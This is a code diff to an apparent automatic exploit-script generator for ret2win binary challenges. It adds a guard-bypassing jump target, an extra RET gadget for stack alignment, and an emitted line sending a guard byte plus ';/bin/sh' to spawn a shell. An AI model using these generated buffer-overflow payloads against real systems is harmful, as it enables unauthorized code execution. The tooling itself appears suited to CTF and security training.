@@ -102,6 +102,7 @@ def render_exp(
     libc_symbols: Mapping[str, int] | None = None,
     stack_truth: Mapping[str, object] | None = None,
     gadgets: Mapping[str, object] | None = None,
+    extra_ret: bool = False,
 ) -> RenderedExp:
     constants: dict[str, str] = {}
     unresolved: list[str] = []
@@ -132,15 +133,28 @@ def render_exp(
 
     if renderer == "ret2win":
         win = facts.win_functions[0] if facts.win_functions else {}
-        address = int(win.get("function_address") or 0)
+        # 跳转点选择：默认函数入口；仅当入口被输入守卫挡路
+        # （gets 后 cmp 常量才 system）时改跳「参数装载指令」绕过守卫
+        setup = int(win.get("argument_setup_address") or 0)
+        address = (setup if win.get("input_guard")
+                   else int(win.get("function_address") or 0))
         if address:
             constants["WIN"] = _address_expr(facts, address)
         else:
             constants["WIN"] = "0x0            # UNRESOLVED: 程序内调用点地址"
             unresolved.append("WIN（程序内调用点地址）")
-        body.append(f'    payload = flat({{OFFSET: [p64(RET), p64(WIN)]}})'
+        ret_chain = "[p64(RET), p64(RET), p64(WIN)]" if extra_ret             else "[p64(RET), p64(WIN)]"
+        body.append(f'    payload = flat({{OFFSET: {ret_chain}}})'
                     if facts.bits == 64 else f'    payload = flat({{OFFSET: [p32(WIN)]}})')
         body.append("    io.sendline(payload)")
+        if extra_ret:
+            body.append("    # 对齐变体：跳进 win 中段时 rsp 差 8，额外 RET 校正 movaps 对齐")
+        guard = win.get("input_guard") or {}
+        if guard.get("compare_value"):
+            # 守卫满足候选：跳过守卫失败时，直接喂「守卫字节 + ; /bin/sh」
+            # 给 win 内部的 gets/system（比如 cmp 'A' → 发 "A;/bin/sh"）
+            guard_byte = int(guard["compare_value"]) & 0xFF
+            body.append('    io.send(bytes([0x{:02x}]) + b";/bin/sh\\n")  # 满足输入守卫后直接起 shell'.format(guard_byte))
 
     elif renderer == "ret2plt":
         system = facts.plt["system"].address
